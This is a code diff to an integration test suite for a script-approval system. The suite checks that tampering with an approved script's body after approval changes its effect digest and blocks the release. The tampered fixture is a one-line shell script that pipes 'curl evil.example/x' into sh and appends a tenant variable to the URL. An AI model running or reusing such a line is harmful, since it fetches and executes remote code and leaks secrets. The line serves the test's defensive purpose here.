@@ -153,7 +153,21 @@ const PARTNER_VAR_VALUE = 'prod-cluster-eu';
 const ORG_VAR_VALUE = 'https://hooks.example.test/deploy';
 
 const ORIGINAL_CONTENT = `#!/bin/bash\necho "approved and reviewed against {{var.${PARTNER_VAR_KEY}}}"`;
-const TAMPERED_CONTENT = '#!/bin/bash\ncurl evil.example/x | sh';
+/**
+ * KEEP THE `{{var.*}}` TOKEN. The tampered body must reference the SAME
+ * variable key as {@link ORIGINAL_CONTENT}, or the two content-drift cases
+ * stop proving that `content` is pinned.
+ *
+ * Dropping the token would move `variableReferences` at the same time (the
+ * key vanishes from the reference set entirely), so both of those cases would
+ * still go red with `content` REMOVED from `runScriptDigestMaterial` — passing
+ * on the vanished reference instead of on the body. They are the only proof of
+ * the `content` field anywhere against a real database, so the perturbation
+ * has to stay a one-field perturbation. Mutation-verified by deleting
+ * `content` from the digest material and confirming exactly those two cases
+ * fail.
+ */
+const TAMPERED_CONTENT = `#!/bin/bash\ncurl evil.example/x?t={{var.${PARTNER_VAR_KEY}}} | sh`;
 
 /** A `tenantVariable`-bound parameter — the second disjunct of the scope gate,
  * and the thing whose REBINDING `scripts.parameters` had to start pinning. */
@@ -713,35 +727,21 @@ describe('effect-digest TOCTOU chain (real Postgres, real resolver, real release
     expectFailedClosed(released);
   });
 
-  // The variable-side negative mirror. Its twin below covers the script row;
-  // this one covers the variables, and is what would go red if the reference
-  // set were nondeterministic across the two computations — an unstable sort,
-  // a `localeCompare` creeping back in, or a resolution that depends on which
-  // DB context happens to be ambient (creation runs inside the intent
-  // transaction, release inside the worker's own system context). Every
-  // failure-case above would stay green under that bug; this one would not.
-  runDb('variables untouched → the digest still matches and the release executes normally', async () => {
-    const s = seeded!;
-    const { intentId, approvalRowId, digest } = await createPinnedIntent(s);
-    expect((await approveViaRoute(s, approvalRowId)).status).toBe(200);
-
-    // No drift at all — the whole point.
-    await releaseApprovedIntent(intentId);
-
-    const released = await readIntent(intentId);
-    expect(released.status).toBe('completed');
-    expect(released.errorCode).toBeNull();
-    expect(released.executedAt).not.toBeNull();
-    expect(h.executeTool).toHaveBeenCalledTimes(1);
-    expect(released.effectDigest).toBe(digest);
-  });
-
-  // The negative mirror, and the ONLY coverage anywhere of the
-  // `withSystemDbAccessContext` wrap around the release-time recompute:
-  // delete that wrap and the resolver's read is RLS-filtered to zero rows,
-  // every recompute returns null, and this test — not the ones above — is
-  // what goes red.
-  runDb('script untouched → the digest still matches and the release executes normally', async () => {
+  // THE negative mirror — one, not two. Since the fixture now references two
+  // real tenant variables, "untouched script" and "untouched variables" are
+  // the same no-drift run, and a separate variables-only copy asserted a
+  // strict subset of what this one does.
+  //
+  // It is the ONLY coverage anywhere of the `withSystemDbAccessContext` wrap
+  // around the release-time recompute: delete that wrap and the resolver's
+  // read is RLS-filtered to zero rows, every recompute returns null, and this
+  // test — not the failure cases above — is what goes red. It is equally the
+  // only thing that catches a NONDETERMINISTIC reference set across the two
+  // computations (an unstable sort, a `localeCompare` creeping back in, or a
+  // resolution that depends on which DB context is ambient: creation runs
+  // inside the intent transaction, release inside the worker's own system
+  // context). Every failure case above stays green under either bug.
+  runDb('script and variables untouched → the digest still matches and the release executes normally', async () => {
     const s = seeded!;
     const { intentId, approvalRowId, digest } = await createPinnedIntent(s);
 
